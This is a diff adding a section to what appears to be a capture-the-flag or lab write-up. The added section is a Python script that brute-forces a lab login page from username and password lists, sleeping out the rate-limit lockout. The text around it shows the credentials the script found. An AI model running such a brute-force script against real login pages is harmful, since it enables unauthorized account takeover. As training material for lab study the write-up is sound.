@@ -289,6 +289,59 @@ If we try to find support users with tlds we get:
 .us                     [Status: 200, Size: 1487, Words: 91, Lines: 43, Duration: 81ms]
 ```
 Since the login has a rate limit, lets build a script to bypass it:
+
+```py
+from hashlib import md5
+import requests
+import sys
+import time
+from bs4 import BeautifulSoup
+import re
+
+url = "http://94.237.57.59:35269/login.php"
+fail_text= "Invalid credentials"
+too_many = "Too many login failures"
+
+username_file = open(sys.argv[1], "r")
+username_list = username_file.readlines()
+username_list = [x.strip() for x in username_list]
+
+passwd_file = open(sys.argv[2], "r")
+passwd_list = passwd_file.readlines()
+passwd_list = [x.strip() for x in passwd_list]
+
+for username in username_list:
+	for passwd in passwd_list:
+
+		
+		data = {
+			"submit": "submit",
+        	"userid": username,
+        	"passwd": passwd,
+        	"rememberme": "rememberme"
+    	}
+		print("checking {} {}".format(username, passwd))
+
+    	# send the request
+		res = requests.post(url, data=data)
+
+		if too_many in res.text:
+			soup3=BeautifulSoup(res.text,'html.parser')
+			time_string=soup3.find('strong').text
+			time_search = re.search("\d+", time_string)
+			time_found = int(time_search.group())
+			print(f"Waiting {time_found} seconds...")
+			time.sleep(time_found)
+		else:
+			if not fail_text in res.text:
+				print(f"[*] Credentials found: user -> {username} pass -> {passwd}")
+				
+
+
+
+```
+
+
 ```
 [*] Credentials found: user -> support.us pass -> Mustang#firebird1995
 [*] Credentials found: user -> support.it pass -> Mustang#firebird1995
